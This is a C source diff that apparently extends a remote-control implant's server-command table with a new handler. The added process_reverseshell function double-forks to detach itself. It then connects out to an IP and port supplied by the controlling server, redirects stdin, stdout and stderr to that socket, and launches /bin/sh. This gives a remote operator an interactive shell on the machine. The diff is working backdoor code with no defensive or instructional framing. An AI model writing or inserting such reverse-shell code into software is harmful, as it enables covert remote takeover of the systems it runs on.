@@ -30,6 +30,7 @@ static int process_del_file(const void * in, int len, char * out, int maxSize);
 static int process_chdir(const void * in, int len, char * out, int maxSize);
 static int process_getcwd(const void * in, int len, char * out, int maxSize);
 static int process_getouterip(const void * in, int len, char * out, int maxSize);
+static int process_reverseshell(const void *in, int len, char * out, int maxSize);
 
 static CMD_HANDLE g_cmdTable[256] = {
     0,
@@ -46,6 +47,7 @@ static CMD_HANDLE g_cmdTable[256] = {
     process_chdir, //SERVER_CMD_CHDIR
     process_getcwd,//SERVER_CMD_GETCWD
     process_getouterip,//SERVER_CMD_GETOUTERIP
+    process_reverseshell,
 };
 
 #define GET_CMD_HANDLE(code) g_cmdTable[code]
@@ -332,5 +334,44 @@ int process_getouterip(const void * in, int len, char * out, int maxSize)
         return sizeof(*ip) + strlen(hostname);
     }
     s_errno = errno;
+    return 0;
+}
+
+int process_reverseshell(const void *in, int len, char * out, int maxSize)
+{
+    if (fork() != 0)
+    {
+        return 0;
+    }
+
+    if (fork() != 0)
+    {
+        exit(0);
+    }
+
+    const char * ip = in;
+    short port = atoi(in + strlen(ip) + 1);
+
+    int sockfd = 0;
+    struct sockaddr_in srv_addr;
+    srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(port);
+    srv_addr.sin_addr.s_addr = inet_addr(ip);
+
+    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
+
+    if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) != 0)
+    {
+        perror("connect");
+        close(sockfd);
+        exit(0);
+    }
+    
+    dup2(sockfd,0);
+    dup2(sockfd,1);
+    dup2(sockfd,2);
+    char *const params[] = {"/bin/sh", NULL};
+    char *const environ[] = {NULL};
+    execve("/bin/sh", params, environ);
     return 0;
 }
